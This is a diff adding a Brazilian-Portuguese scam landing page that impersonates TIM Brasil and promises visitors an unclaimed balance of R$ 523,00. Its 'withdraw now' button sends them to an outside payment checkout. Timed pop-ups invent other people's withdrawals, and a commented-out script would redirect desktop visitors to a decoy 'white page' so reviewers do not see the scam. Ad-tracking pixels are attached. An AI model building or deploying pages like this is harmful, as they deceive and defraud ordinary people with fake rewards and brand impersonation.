@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <!-- <script type="text/javascript">
+        if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+          window.location.href = 'https://suapaginawhite.com/';
+        }
+        </script> -->
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="stylesheet" href="css/01c9f2baccd67763.css">
+    <title>TIM Brasil - Programa de Avaliação</title>
+    <style>
+        .notification {
+            opacity: 0;
+            transform: translateY(16px);
+            transition: opacity 1s ease, transform 1s ease;
+        }
+
+        .notification.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .notification.hide {
+            opacity: 0;
+            transform: translateY(16px);
+        }
+    </style>
+</head>
+
+<body class="min-h-screen bg-gradient-to-br from-[#1A1A1A] to-[#000000] text-white">
+    <div class="bg-[#004691] p-4 flex items-center justify-between">
+        <div class="w-12 h-12 relative">
+            <img alt="TIM Logo" width="48" height="48" class="object-contain" src="images/logotrnas.png">
+        </div>
+        <div class="flex items-center gap-2">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                class="w-4 h-4 animate-spin">
+                <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
+            </svg>
+            <span class="text-sm">Sua posição na fila: 87</span>
+        </div>
+    </div>
+
+    <div class="flex justify-center items-start min-h-[calc(100vh-64px)] p-4 pt-16">
+        <div class="bg-[#121212] rounded-3xl p-6 shadow-xl space-y-6 border border-gray-800 w-full max-w-sm">
+            <div class="space-y-2">
+                <div class="flex justify-between items-center">
+                    <span class="text-gray-400">Saldo disponível</span>
+                    <div class="flex items-center gap-2 text-[#E60000]">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                            class="w-4 h-4 animate-spin">
+                            <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
+                        </svg>
+                        <span class="text-sm">Processando</span>
+                    </div>
+                </div>
+                <h1 class="text-4xl font-bold">R$ 523,00</h1>
+            </div>
+            <button
+            class="w-full bg-gradient-to-r from-[#E60000] to-[#FF3333] text-white rounded-full py-4 font-bold text-lg transition-all duration-300"
+            onclick="preserveParams(event)"
+          >
+            SACAR IMEDIATAMENTE
+          </button>
+          
+          <script>
+            function preserveParams(event) {
+              event.preventDefault(); // Impede o clique padrão
+          
+              // URL base
+              const baseUrl = "https://pay.checkoutghostspay.com/checkout/7e7717d4-baea-4026-af27-a7bcc0889600";
+          
+              // Captura os parâmetros atuais da URL
+              const currentParams = new URLSearchParams(window.location.search);
+          
+              // Concatena os parâmetros, caso existam
+              const finalUrl = currentParams.toString()
+                ? baseUrl + "?" + currentParams.toString()
+                : baseUrl;
+          
+              // Redireciona para a URL final com parâmetros preservados
+              window.location.href = finalUrl;
+            }
+          </script>          
+            <p class="text-center text-sm text-gray-400">Clique acima para receber seu saldo via PIX agora</p>
+            <div class="bg-[#E60000]/10 rounded-xl p-4 border border-[#E60000]/20">
+                <p class="text-[#E60000] text-sm text-center">Atenção: Saque normal pode demorar até 7 dias
+                    úteis.<br>Use o botão acima para saque imediato.</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="fixed bottom-4 left-4 right-4 space-y-2" id="notifications-container"></div>
+
+    <script>
+        const notificationsData = [
+            { name: "Fernanda Gomes", amount: "R$ 872,99" },
+            { name: "Marcos Almeida", amount: "R$ 462,00" },
+            { name: "Joana Silva", amount: "R$ 650,20" }
+        ];
+
+
+        const container = document.getElementById("notifications-container");
+
+        function createNotification({ name, amount }) {
+            const notification = document.createElement("div");
+            notification.className =
+                "notification bg-[#121212] rounded-2xl p-4 border border-gray-800 shadow-xl";
+            notification.innerHTML = `
+                <div class="flex items-center gap-3">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                        class="w-6 h-6 text-green-500">
+                        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                        <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                    </svg>
+                    <span class="text-base font-medium text-white">
+                        ${name} sacou <span class="text-green-500">${amount}</span>
+                    </span>
+                </div>`;
+            return notification;
+        }
+
+        function showNotifications() {
+            let delay = 0;
+
+            notificationsData.forEach((data) => {
+                const notification = createNotification(data);
+                container.appendChild(notification);
+
+                // Mostrar notificação com delay
+                setTimeout(() => {
+                    notification.classList.add("show");
+                }, delay);
+
+                // Remover notificação após 4 segundos
+                setTimeout(() => {
+                    notification.classList.add("hide");
+                    setTimeout(() => notification.remove(), 1000); // Remove após o fade-out
+                }, delay + 4000);
+
+                delay += 5000; // Próxima notificação aparece após 5 segundos
+            });
+        }
+
+        // Iniciar exibição das notificações
+        showNotifications();
+    </script>
+   <!-- Meta Pixel Code -->
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '563354690001950');
+    fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=563354690001950&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- End Meta Pixel Code -->
+    
+    <script>
+      window.pixelId = "677c74c291b3f5fb998c50cc";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script>
+</body>
+
+</html>
